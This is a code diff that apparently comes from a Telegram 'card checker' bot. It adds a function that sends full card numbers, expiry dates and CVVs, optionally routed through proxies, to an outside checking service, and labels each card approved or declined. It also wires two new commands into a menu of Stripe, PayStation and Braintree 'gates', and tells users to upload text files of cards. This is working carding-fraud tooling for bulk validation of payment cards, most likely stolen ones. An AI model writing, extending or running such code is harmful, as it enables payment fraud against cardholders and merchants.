@@ -572,6 +572,46 @@ def test_proxy_connectivity(proxy_str):
     return False, 0, last_error
 
 
+def check_cc_hiapi(cc_number, month, year, cvv, endpoint, proxies=None):
+    """HiAPI gate — uses ck.hiapi.club checker endpoints."""
+    start_time = time.time()
+    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
+
+    try:
+        # Build proxy param for the API
+        proxy_param = ""
+        if proxies:
+            # Extract raw proxy string from dict
+            for scheme in ("https", "http", "socks5", "socks4"):
+                if scheme in proxies:
+                    raw = proxies[scheme].replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
+                    proxy_param = raw
+                    break
+
+        url = f"https://ck.hiapi.club/api/{endpoint}"
+        params = {"c": cc_data}
+        if proxy_param:
+            params["p"] = proxy_param
+
+        resp = requests.get(url, params=params, timeout=30)
+        process_time = round(time.time() - start_time, 2)
+
+        if resp.status_code == 200:
+            text_resp = resp.text.strip()
+            text_lower = text_resp.lower()
+
+            if any(k in text_lower for k in ("approved", "success", "live", "charged", "authenticate")):
+                return f"Approved | {text_resp[:120]} ({process_time}s)"
+            elif any(k in text_lower for k in ("declined", "deny", "fail", "insufficient", "expired", "invalid", "do not honor", "lost", "stolen", "restricted", "pickup")):
+                return f"Declined | {text_resp[:120]} ({process_time}s)"
+            else:
+                return f"Unknown | {text_resp[:120]} ({process_time}s)"
+        else:
+            return f"Declined | HTTP {resp.status_code} ({process_time}s)"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
 def check_cc_stc(cc_number, month, year, cvv, proxies=None):
     """STC gate — PayStation NZ payment gateway auth."""
     start_time = time.time()
@@ -715,6 +755,10 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                 result = check_cc_stc(c_num, c_mm, c_yy, c_cvv, proxy_dict)
             elif gate == "auth2":
                 result = check_cc_auth2(c_num, c_mm, c_yy, c_cvv, proxy_dict)
+            elif gate == "st1":
+                result = check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check3", proxy_dict)
+            elif gate == "st5":
+                result = check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check", proxy_dict)
             else:
                 result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
         else:
@@ -830,6 +874,8 @@ def fmt_start(is_adm=False):
         "  /auth       — Stripe Auth (Dilaboards)\n"
         "  /auth2      — Stripe Auth (Stormx)\n"
         "  /stc        — PayStation Auth (NZ)\n"
+        "  /st1        — HiAPI Check3\n"
+        "  /st5        — HiAPI Check\n"
         "  /nonvbv     — Braintree Non-VBV (coming soon)\n"
         "  /charge     — Stripe Checkout $3 (coming soon)\n\n"
         "<b>Commands:</b>\n"
@@ -857,7 +903,7 @@ def fmt_start(is_adm=False):
     base += (
         "<b>How to use:</b>\n"
         "  1. Send a .txt file\n"
-        "  2. Reply to the file with /auth or /auth2\n"
+        "  2. Reply to the file with a gate (/auth, /st1, /st5, etc.)\n"
         "  3. Wait for results\n"
         f"{FOOTER}"
     )
@@ -1462,8 +1508,8 @@ def handle_update(update):
         return
 
     # --- /auth, /auth2, /stc (gate commands) ---
-    if text in ("/auth", "/auth2", "/stc"):
-        gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/auth2": ("auth2", "Stripe Auth (Stormx)"), "/stc": ("stc", "PayStation Auth (NZ)")}
+    if text in ("/auth", "/auth2", "/stc", "/st1", "/st5"):
+        gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/auth2": ("auth2", "Stripe Auth (Stormx)"), "/stc": ("stc", "PayStation Auth (NZ)"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check")}
         gate, gate_label = gate_map[text]
 
         if not is_authorized(user_id):
